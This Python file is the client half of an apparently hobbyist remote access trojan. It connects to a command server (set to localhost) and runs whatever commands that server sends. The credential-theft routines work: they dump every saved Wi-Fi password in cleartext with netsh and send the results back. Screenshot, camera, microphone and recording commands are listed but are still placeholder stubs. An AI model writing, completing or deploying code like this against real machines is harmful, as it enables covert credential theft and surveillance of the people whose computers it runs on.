import socket
import os
import subprocess
import shlex
import re
import json

# Client configuration
SERVER_HOST = "127.0.0.1"  # Server IP
SERVER_PORT = 65432        # Server port

# Function to generate help description with aligned formatting
def help():
    """
    Generates a formatted help message listing commands and their descriptions.

    Args:
        commands_dict (dict): A dictionary where keys are commands and values are tuples (function, description).

    Returns:
        str: A formatted help message.
    """
    if not commands_dict:
        return "No commands available."
    
    # Calculate the width of the longest command for alignment
    max_command_length = max(len(command) for command in commands_dict.keys())
    
    # Build the help message with aligned formatting
    help_message = "Available Commands:\n"
    for command, (_, description) in commands_dict.items():
        help_message += f"{command.ljust(max_command_length + 2)}: {description}\n"
    
    return help_message

def get_wifi_profiles():
    wifi_profiles = []
    pattern = r"All User Profile\s+:\s+(.*)"
    try:
        process_result = subprocess.run(shlex.split('netsh wlan show profiles'),capture_output=True, text=True)
        wifi_profiles = re.findall(pattern, process_result.stdout)
        return wifi_profiles
    except Exception as e:
        raise e
    
def get_wifi_password_of(profile):
    profile_pwd="None"
    try:
        process_result = subprocess.run(shlex.split(f'netsh wlan show profiles name="{profile}" key=clear'),capture_output=True, text=True)
        key_content_match = re.search(r"Key Content\s*:\s*(.*)", process_result.stdout)
        profile_pwd = key_content_match.group(1).strip() if key_content_match else "Not found"
    except Exception as e:
        raise e
    return f"{profile}: {profile_pwd}"

def get_wifi_password_all():
    wifi_profiles_with_pwd = {}
    wifi_profiles = get_wifi_profiles()
    for profile in wifi_profiles:
        try:
            process_result = subprocess.run(shlex.split(f'netsh wlan show profiles name="{profile}" key=clear'),capture_output=True, text=True)
            # Extract 'Key Content' from Security settings
            key_content_match = re.search(r"Key Content\s*:\s*(.*)", process_result.stdout)
            profile_pwd = key_content_match.group(1).strip() if key_content_match else "Not found"
            wifi_profiles_with_pwd[profile] = profile_pwd
        except Exception as e:
            raise e
    return wifi_profiles_with_pwd
def screanshort():
    return "Taking a screenshot..."

def stream_camera():
    return "Streaming camera..."

def stream_mic():
    return "Streaming microphone..."

def capture_video():
    return "Capturing video..."

def capture_audio():
    return "Capturing audio..."

def exit():
    return "Terminating the connection..."


# Unified commands dictionary
# Creat a command to be executed as a function and add that function as below
# "function_as_string": (function reference, "Discription")
#         key         : value
commands_dict = {
    "help": (help, "Displays help information."),
    "screanshort": (screanshort, "Takes a screenshot."),
    "stream_camera": (stream_camera, "Streams the camera."),
    "stream_mic": (stream_mic, "Streams the microphone."),
    "capture_video": (capture_video, "Captures video."),
    "capture_audio": (capture_audio, "Captures audio."),
    "get_wifi_profiles": (get_wifi_profiles, "Shows the available wifi profiles"),
    "get_wifi_password_all": (get_wifi_password_all, "Fetches saved Wi-Fi passwords for all the available profiles."),
    "exit": (exit,"Terminates the active connection.")
}
valid_commands = tuple(commands_dict.keys())




# Function to handle user input and execute the corresponding function
def execute_command(command):
    """
    Executes a function based on the provided command.

    Args:
        command (str): The command entered by the user.

    Returns:
        None
    """
    if command in commands_dict:
        # Call the function associated with the command
        return commands_dict[command][0]()  # Access the function and call it
    else:
        print(f"Invalid command: '''{command}'''. Use 'help' to see available commands.")


def client_main():
    """
    The main entry point for the client application.
    """
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client_socket:
        client_socket.connect((SERVER_HOST, SERVER_PORT))
        print(f"[*] Connected to server at {SERVER_HOST}:{SERVER_PORT}")

        while True:
            command = client_socket.recv(1024).decode()
            if command == "exit":
                print("[*] Connection terminated by the server.")
                break
            if command in valid_commands:
                print(f"[*] Received command: {command}")
                result = execute_command(command)
                # Ensure the result is a string before encoding
                if isinstance(result, (str, bytes)):
                    # Send result directly without additional quotes or conversion unless it's a non-string object
                    client_socket.sendall(result.encode() if isinstance(result, str) else result)
                else:
                    # If result is a complex type (list, tuple, dict), convert it to JSON string before encoding
                    result_str = json.dumps(result)
                    client_socket.sendall(result_str.encode())
        
if __name__ == "__main__":
    client_main()

